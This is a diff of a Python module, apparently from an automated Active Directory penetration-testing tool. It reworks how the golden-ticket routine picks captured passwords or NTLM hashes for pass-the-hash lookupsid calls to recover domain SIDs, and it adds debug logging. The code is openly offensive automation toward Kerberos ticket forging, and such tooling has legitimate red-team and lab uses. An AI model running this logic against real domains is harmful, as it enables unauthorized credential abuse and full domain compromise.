@@ -398,8 +398,8 @@ async def _run_nmap_on_worker(targets: list[str], namespace: str) -> tuple[str, 
                     # Fallback: parse NetBIOS name from nbstat output
                     # NOTE: We only use the NetBIOS hostname, not the domain group name.
                     # Constructing FQDNs like "{netbios}.{domain}.local" is wrong because
-                    # we don't know the actual domain suffix (e.g., "north" could be
-                    # "north.sevenkingdoms.local", not "north.local"). The actual FQDN
+                    # we don't know the actual domain suffix (e.g., "child" could be
+                    # "child.contoso.local", not "child.local"). The actual FQDN
                     # will be discovered via DNS/LDAP enumeration.
                     nb_match = re.search(r"nbstat:\s*NetBIOS name:\s*([^,]+)", nb_stdout)
                     if nb_match:
@@ -3220,43 +3220,50 @@ async def _auto_golden_ticket(
                 )
 
                 # Need a credential or hash to run lookupsid
-                # First try password credential, then fall back to hash-based auth
+                # Priority: same-domain password > same-domain hash > cross-domain password > cross-domain hash
+                # Cross-domain auth often fails for SID lookup, so prefer same-domain creds
                 cred = None
                 auth_hash = None
 
-                # Try to find password credential for this domain first
+                # 1. Try to find password credential for this domain first (most reliable)
                 for c in state.all_credentials:
                     if c.password and c.domain and c.domain.lower() == domain.lower():
                         cred = c
                         break
 
+                # 2. Try same-domain NTLM hash (PTH) - more reliable than cross-domain password
                 if not cred:
-                    # Try any password credential
+                    for h in state.all_hashes:
+                        if h.hash_type.lower() != "ntlm":
+                            continue
+                        # Skip krbtgt and machine accounts - use regular user accounts
+                        if h.username.lower() == "krbtgt" or h.username.endswith("$"):
+                            continue
+                        # Same domain only
+                        if h.domain and h.domain.lower() == domain.lower():
+                            auth_hash = h
+                            logger.debug(
+                                f"🎫 Auto-golden-ticket: Using same-domain hash for {domain}: "
+                                f"{h.domain}\\{h.username}"
+                            )
+                            break
+
+                # 3. Try any password credential (cross-domain auth may work)
+                if not cred and not auth_hash:
                     for c in state.all_credentials:
                         if c.password:
                             cred = c
                             break
 
-                if not cred:
-                    # No password credential - try hash-based auth
-                    # Look for any NTLM hash we can use (prefer same domain, exclude krbtgt)
+                # 4. Try any NTLM hash (cross-domain PTH as last resort)
+                if not cred and not auth_hash:
                     for h in state.all_hashes:
                         if h.hash_type.lower() != "ntlm":
                             continue
-                        # Skip krbtgt - it's a service account, use a user account
-                        if h.username.lower() == "krbtgt":
+                        if h.username.lower() == "krbtgt" or h.username.endswith("$"):
                             continue
-                        # Prefer same domain
-                        if h.domain and h.domain.lower() == domain.lower():
-                            auth_hash = h
-                            break
-
-                    if not auth_hash:
-                        # Try any NTLM hash (cross-domain auth may work)
-                        for h in state.all_hashes:
-                            if h.hash_type.lower() == "ntlm" and h.username.lower() != "krbtgt":
-                                auth_hash = h
-                                break
+                        auth_hash = h
+                        break
 
                 if not cred and not auth_hash:
                     logger.warning(
@@ -3336,13 +3343,20 @@ async def _auto_golden_ticket(
 
                     output = stdout + "\n" + (stderr or "")
 
+                    # Debug log to see actual lookupsid output
+                    output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
+                    logger.debug(
+                        f"🎫 Auto-golden-ticket: lookupsid output for {domain}: {output_preview}"
+                    )
+
                     # Parse domain SID from output
                     sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
                     if not sid_match:
                         # Lookupsid ran but couldn't extract SID - this is a permanent failure
                         # (bad creds, wrong domain, etc.)
                         logger.warning(
-                            f"🎫 Auto-golden-ticket: Could not extract domain SID for {domain}"
+                            f"🎫 Auto-golden-ticket: Could not extract domain SID for {domain}, "
+                            f"output: {output_preview}"
                         )
                         state.add_golden_ticket(
                             {
